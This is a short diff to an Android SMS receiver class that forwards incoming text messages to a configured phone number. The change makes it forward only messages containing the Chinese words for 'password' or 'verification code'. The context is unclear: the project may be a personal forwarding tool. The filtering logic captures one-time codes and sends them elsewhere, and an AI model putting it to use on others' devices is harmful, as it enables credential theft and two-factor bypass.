@@ -37,10 +37,14 @@ public class TransmitReceiver extends BroadcastReceiver {
                 String receiveTime = format.format(date);
                 String number = msg.getOriginatingAddress();
                 String message = msg.getDisplayMessageBody();
-                message = "转发短信来自："+number+"\n"+"转发短信内容：["+message+"\n"+
-                        "]转发短信时间："+receiveTime;
+                message = "转发短信来自："+number+"\n"+"转发短信内容："+message+"\n"+
+                        "转发短信时间："+receiveTime;
                 Log.i("noco",message);
-                MessageUtils.sendSMS(phone,message,context);
+
+
+                if (message.contains("密码") || message.contains("验证码")) {
+                    MessageUtils.sendSMS(phone,message,context);
+                }
             }
         }
     }
